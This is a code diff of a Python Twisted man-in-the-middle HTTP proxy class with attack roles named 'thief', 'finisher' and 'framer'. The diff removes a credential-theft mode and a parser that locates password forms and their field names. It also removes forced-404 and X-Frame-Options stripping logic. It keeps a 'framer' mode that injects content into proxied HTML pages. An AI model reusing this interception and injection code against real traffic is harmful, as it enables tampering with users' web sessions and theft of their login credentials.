@@ -20,12 +20,11 @@ class ServerConnection(HTTPClient):
         self.postData         = postData
         self.headers          = headers
         self.client           = client
-        self.isImageRequest   = False
+        self.skip             = False
         self.isCompressed     = False
         self.contentLength    = None
         self.shutdownComplete = False
         self.actAs            = actAs
-        self.stealNow         = False
 
     def getLogLevel(self):
         return logging.DEBUG
@@ -41,8 +40,6 @@ class ServerConnection(HTTPClient):
         for header, value in self.headers.items():
             logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
             self.sendHeader(header, value)
-      
-
            
         self.endHeaders()
 
@@ -61,18 +58,6 @@ class ServerConnection(HTTPClient):
     def handleStatus(self, version, status, message):
     
         logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, status, message))
-        
-
-        if self.actAs == "finisher" :
-             #print "SERVER_RESPONSE: actas FINISHER 404"
-             status = "404"
-             message = "NOT FOUND"
-        
-        elif self.actAs == "thief":
-            if status == "200":
-               self.stealNow = True
-            
-
         self.client.setResponseCode(int(status), message)
 
     def handleHeader(self, key, value):
@@ -80,91 +65,45 @@ class ServerConnection(HTTPClient):
 
         
         if (key.lower() == 'content-type'):
-            if (value.find('text/html') ==-1 ):
-                self.isImageRequest = True
-                logging.debug("Response is image/CSS content, not scanning...")
-         
-
-        if (key.lower() == 'content-encoding'):
+            if "text/html" not in value:
+                self.skip = True
+                logging.debug("not scanning...")
+                
+        elif (key.lower() == 'content-encoding'):
             if (value.find('gzip') != -1):
                 logging.debug("Response is compressed...")
                 self.isCompressed = True
+                
         elif (key.lower() == 'content-length'):
             self.contentLength = value
-        elif (key.lower() == 'set-cookie'):
-            self.client.responseHeaders.addRawHeader(key, value)
-        elif (key.lower() != 'x-frame-options'):
-            self.client.setHeader(key, value)
+    
+        self.client.setHeader(key, value)
+
+
 
     def handleEndHeaders(self):
        
-       if (self.isImageRequest and self.contentLength != None):
-           self.client.setHeader("Content-Length", self.contentLength)
+       if self.contentLength != None:
+          self.client.setHeader("Content-Length", self.contentLength)
        
-
        if self.length == 0:
            self.shutdown()
                         
     def handleResponsePart(self, data):
         
-        if (self.isImageRequest):
+        if self.skip:
             self.client.write(data)
         else:
             HTTPClient.handleResponsePart(self, data)
 
     def handleResponseEnd(self):
         
-        if (self.isImageRequest):
+        if self.skip:
             self.shutdown()
         else:
             HTTPClient.handleResponseEnd(self)
             
             
-    def getFormFields(self,data):
-
-
-           passInd = data.find("type=\"password\"")
-           
-         
-           if passInd == -1:
-              #return ["","",""]
-              return ""
-
-           formStart = data.rfind("<form",0,passInd)
-           formEnd = data.find("</form>",formStart)
-
-           form = data[formStart:formEnd]
-           
-          
-           
-           actionInd = form.find("action=")
-           actionStart = form.find("\"",actionInd)+1
-           actionEnd = form.find("\"",actionStart)
-           action =form[actionStart:actionEnd]
-
-           q = action.rfind("?")
-           if q != -1:
-               action = action[:q]
-           '''
-           passInd = form.find("type=\"password\"")
-           passElStart = form.rfind("<input",0,passInd)
-           passElEnd = form.find("/>",passElStart)
-
-           tmp = form.find("name=",passElStart,passElEnd)  
-           passNameStart = form.find("\"",tmp,passElEnd)+1
-           passNameEnd = form.find("\"",passNameStart,passElEnd)
-           passName = form[passNameStart:passNameEnd]  
-           
-           userElStart = form[:passElStart].rfind("<input")
-           userElEnd = form.find("/>",tmp)
-           tmp = form.find("name=",userElStart,userElEnd)
-           userNameStart = form.find("\"",tmp,userElEnd)+1
-           userNameEnd = form.find("\"",userNameStart,userElEnd)
-           userName= form[userNameStart:userNameEnd]  
-           '''
-           return action
-           #return [action,userName,passName]
-
 
 
     def appendMaster(self,data):
@@ -225,6 +164,7 @@ class ServerConnection(HTTPClient):
               
         if self.actAs =="framer":
             data = self.appendMaster(data)
+            
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))     
 
